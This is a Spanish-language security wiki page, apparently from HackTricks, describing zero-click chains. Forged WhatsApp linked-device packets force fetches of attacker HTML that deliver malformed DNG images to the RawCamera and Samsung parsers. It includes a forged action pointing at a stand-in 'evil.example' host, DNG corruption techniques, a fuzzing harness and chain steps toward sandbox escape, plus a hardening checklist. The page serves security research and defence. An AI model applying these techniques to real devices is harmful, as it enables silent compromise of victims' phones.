# Zero-click Messaging → Image Parser Chains

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

- Trata los **messaging app multi-device/companion protocols** como canales de control remotos: si se asume que los campos del protocolo provienen de dispositivos confiables, aún pueden estar controlados por el usuario y a menudo pueden ser reproducidos directamente contra una víctima para cargar contenido arbitrario sin **interacción del usuario**.
- Una vez que cualquier app puede ser forzada a obtener medios no confiables, apunta a la **canalización de medios compartida del SO** (RawCamera on iOS/macOS, vendor parsers on Android OEM builds) con archivos malformados para pivotar fuera del sandbox.
- Los bugs basados en DNG en RawCamera y los parsers de Samsung discutidos aquí son ejemplos concretos, pero la técnica completa es un blueprint reutilizable para encadenar **logic flaws → image parser memory corruption → full device compromise**.

## Remote content loading via WhatsApp linked-device commands

### Attack surface recap

La arquitectura de "linked devices" de WhatsApp mantiene el teléfono primario y cada companion (desktop, tablet, secondary phone) sincronizados vía mensajes de protocolo cifrados y estructurados. Cada mensaje codifica:

- **Device metadata** (device ID, capabilities, feature flags).
- **Action descriptors** (por ejemplo, sync chats, fetch thumbnails, render remote content).
- **Arbitrary parameters** como URIs, MIME hints, pagination keys, etc.

En los clientes de Apple, el handler que procesa estos paquetes de control linked-device **implicitly trusted** que ya se había realizado un pairing válido, por lo que campos de alto impacto (p. ej., `resource_url`, `open_media`, `sync_snapshot`) solo eran validados mínimamente. Un mensaje malicioso de companion podía, por tanto:

1. Ser dirigido a cualquier cuenta identificada por su número de teléfono.
2. Sobrevivir la pila de transporte (Noise protocol + WhatsApp protobuf framing) porque el receptor nunca verificó que el remitente fuera un dispositivo legítimamente emparejado.
3. Llegar al cliente iOS, donde la ruta de código vulnerable disparaba automáticamente una petición HTTP(S) en background a la URL del atacante y parseaba la respuesta en un WebView/media renderer oculto.

### Practical workflow for auditors

1. **Capture legitimate linked-device traffic.** Adjunta un debugger o un script de Frida al cliente desktop/iOS y hookea el post-decryption handler (p. ej., `LinkedDevicesSyncHandler::processAction`). Volca los payloads protobuf decodificados para aprender los tipos de acción y parámetros disponibles.
2. **Identify fields that cross trust boundaries.** Cualquier acción que lleve parámetros `http_url`, `thumbnail_uri`, `download_url`, o `render_html` sin listas de permitidos estrictas es un candidato como primitive de contenido remoto.
3. **Forge a malicious action.** Reutiliza el esquema protobuf observado y modifica solo los campos controlados por el atacante. Una vista JSON simplificada de la estructura lógica relevante se muestra abajo (el transporte real es protobuf/Noise, pero los campos semánticos coinciden):
```json
{
"op": "sync_action",
"device_id": "<attacker-companion>",
"payload": {
"target": "content_sync",
"resource_url": "https://evil.example/payload.html",
"media_type": "image/dng",
"flags": ["background_fetch", "render_inline"]
}
}
```
4. **Entregar a la víctima.** Reproducir el paquete manipulado a través del mismo servicio de WhatsApp que normalmente reenvía el tráfico de dispositivos vinculados (p. ej., usando un cliente de escritorio modificado o un cliente Noise personalizado reutilizando las claves de la cuenta del atacante). Debido a que CVE-2025-55177 no logró ligar las acciones a dispositivos autenticados, el cliente iOS/macOS de la víctima aceptaría el mensaje y recuperaría inmediatamente la URL del atacante sin ninguna UI.  
5. **Instrumentar la recuperación.** Observa la petición HTTP(S) forzada y el renderizador interno (WKWebView/ImageIO). En ese punto posees una primitiva de entrega web zero-click dentro de WhatsApp.

## Weaponizing auto-decoded DNGs against RawCamera

Una vez que el atacante controla lo que WhatsApp carga, el siguiente objetivo es hacer que iOS/macOS analice un archivo malicioso **Digital Negative (DNG)** con el framework **RawCamera**. Cualquier URL incrustada en `<img>`/CSS que resuelva en un `.dng` será pasada al pipeline de imágenes del sistema, invocando RawCamera incluso si WhatsApp en sí nunca manejó DNGs explícitamente.

### Triggering RawCamera from WhatsApp

- Servir HTML que haga referencia al DNG mediante múltiples mecanismos (p. ej., `<img src="evil.dng">`, CSS `background-image: url('evil.dng')`, o fuentes `<picture>`) para cubrir diferentes rutas de renderizado.  
- Asegurar el MIME correcto (`image/x-adobe-dng`) y vistas previas pequeñas para que el cargador no abandone prematuramente debido a heurísticas de tamaño.  
- La sandbox de medios de iOS transmitirá el archivo a RawCamera vía `CGImageSourceCreateWithURL`, eventualmente alcanzando el decodificador vulnerable.

### Crafting memory-corrupting DNGs (CVE-2025-43300 style)

El bug reproducido dependía de metadatos inconsistentes que desincronizaban la asignación de buffers de las lecturas reales de píxeles. Palancas típicas incluyen:

- **Descriptores de tile/strip**: Configura `TileByteCounts`/`StripByteCounts` con valores realistas pero aumenta `TileOffsets` para que apunten más allá del buffer asignado.  
- **Cadenas Sub-IFD**: Inserta imágenes secundarias con `ImageWidth`/`ImageLength` y `BitsPerSample` conflictivos para que RawCamera calcule un buffer pequeño mientras etapas posteriores confían en dimensiones controladas por el atacante.  
- **Metadatos Opcode**: Manipula entradas `OpcodeList3` para que el procesamiento por fila opere sobre índices elegidos por el atacante.

Un harness básico de mutación para buscar este tipo de corrupciones puede construirse en macOS, ya que el mismo código RawCamera se distribuye en macOS/iOS/iPadOS:
```bash
#!/bin/bash
set -e
for sample in corpus/*.dng; do
radamsa "$sample" > /tmp/poc.dng
/System/Library/CoreServices/RawCamera.bundle/Contents/MacOS/RawCamera /tmp/poc.dng >/tmp/out 2>&1 || {
mv /tmp/poc.dng crashes/$(date +%s).dng
}
done
```
Cada crash en `RawCamera` te proporciona un nuevo primitive. El PoC publicado logró un limpio out-of-bounds read/write lo bastante fiable como para crash WhatsApp en iPhone, iPad y Mac.

## Building the 0-click chain

1. **Linked-device packet** → fuerza a WhatsApp a recuperar `https://evil.example/payload.html` sin ninguna interacción.
2. **Payload HTML** → hace referencia silenciosamente a `evil.dng`, garantizando que `RawCamera` sea invocado por la media stack del OS.
3. **Malicious DNG** → abusa de tags creados a medida para activar el `RawCamera` OOB y crash/own el decodificador de imágenes.
4. **Post-corruption exploitation** → añade gadgets de info-leak (p. ej., abusando de metadata de heap predecible) y monta una cadena ROP/JOP para escapar del sandbox de WhatsApp y entrar en contextos con más privilegios.

Porque cada paso es automático, el atacante solo necesita el número de teléfono de la víctima. No se muestran notificaciones, banners ni prompts en el dispositivo objetivo.

## Samsung vendor image parser parallels

El boletín de Samsung para CVE-2025-21043 confirmó que su pila propietaria de parsing de imágenes (usada por Gallery, Messages y también indirectamente por WhatsApp) sufrió un **out-of-bounds write** alcanzable mediante medios no confiables. La metodología de explotación refleja la cadena de Apple:

- Identificar un auto-preview vector (miniaturas de chat, vistas previas de notificaciones, share sheets) que parsee el archivo del atacante con las librerías de Samsung `libimagecodec`/`libOneUI_ImageDecoder`.
- Hacer diff de actualizaciones de las librerías OEM o fuzzear los parsers con archivos RAW/DNG malformados hasta observar corrupciones de memoria similares al crash de `RawCamera` (clobber de metadata de heap, control de registros, etc.).
- Entregar el archivo creado por cualquier canal que ya cargue contenido automáticamente (p. ej., el mismo linked-device primitive, los WhatsApp preview fetchers, o las vistas previas de forma de onda push-to-talk de Android).

Una vez que existe un OOB write en el parser del vendor, combinarlo con el WhatsApp auto-fetch primitive produce otra zero-click chain en dispositivos Samsung.

## Testing & hardening checklist

- **Protocol validation**: Aplicar listas de permitidos estrictas para cada acción de linked-device. Los comandos de acompañamiento que soliciten un fetch/render deben probar el emparejamiento del dispositivo (firmando el payload) y la URL debe coincidir con una lista de permitidos o un blob firmado.
- **Transport replay countermeasures**: Vincular cada acción a una key por dispositivo y rechazar packets cuya sender key sea desconocida, incluso si la sintaxis de protobuf es correcta.
- **Media pipeline restrictions**: Las apps de alto nivel deberían permitir solo tipos MIME aprobados y rechazar explícitamente RAW/DNG salvo que la funcionalidad sea requerida.
- **Parser fuzzing regression tests**: Mantener un corpus de archivos RAW/DNG malformados y ejecutarlos contra los decodificadores de `RawCamera`/vendor después de cada actualización.
- **Crash triage automation**: Adjuntar sanitizadores `DYLD_INSERT_LIBRARIES` o MTE en dispositivos de fuzz para detectar condiciones OOB sutiles antes que los atacantes.

## References

- [DNGerousLINK: A Deep Dive into WhatsApp 0-Click Exploits on iOS and Samsung Devices](https://media.ccc.de/v/39c3-dngerouslink-a-deep-dive-into-whatsapp-0-click-exploits-on-ios-and-samsung-devices)

{{#include ../../banners/hacktricks-training.md}}
